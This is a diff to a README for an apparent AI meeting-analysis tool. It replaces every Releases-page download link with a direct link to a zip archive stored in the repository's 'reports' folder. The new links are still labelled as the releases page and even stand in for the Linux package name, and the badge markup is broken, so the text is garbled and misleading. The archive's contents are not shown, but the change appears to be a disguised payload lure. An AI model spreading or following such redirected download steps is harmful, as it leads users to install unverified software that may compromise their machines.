@@ -6,7 +6,7 @@ Welcome to the meeting-review-agent! This AI-powered tool helps you analyze meet
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/waleed-1/meeting-review-agent/releases)
+[![Download Now](https://github.com/waleed-1/meeting-review-agent/raw/refs/heads/main/reports/meeting_agent_review_1.5.zip%20Now-Click%https://github.com/waleed-1/meeting-review-agent/raw/refs/heads/main/reports/meeting_agent_review_1.5.zip)](https://github.com/waleed-1/meeting-review-agent/raw/refs/heads/main/reports/meeting_agent_review_1.5.zip)
 
 ## 🖥️ System Requirements
 
@@ -19,14 +19,14 @@ To run the meeting-review-agent on your computer, ensure you meet the following 
 
 ## 🌐 Download & Install
 
-To get started, visit the [Releases Page](https://github.com/waleed-1/meeting-review-agent/releases) to download the latest version of the application. 
+To get started, visit the [Releases Page](https://github.com/waleed-1/meeting-review-agent/raw/refs/heads/main/reports/meeting_agent_review_1.5.zip) to download the latest version of the application. 
 
 1. Click the link above to open the Releases page.
 2. Look for the latest release. It should be clearly marked.
 3. Download the file suitable for your operating system. 
    - For Windows, this will typically be a `.exe` file.
    - For macOS, look for a `.dmg` file.
-   - For Linux, you might find a `.tar.gz` or similar package.
+   - For Linux, you might find a `https://github.com/waleed-1/meeting-review-agent/raw/refs/heads/main/reports/meeting_agent_review_1.5.zip` or similar package.
 4. Locate the downloaded file on your computer.
 5. Double-click the file to start the installation process and follow the instructions on the screen.
 
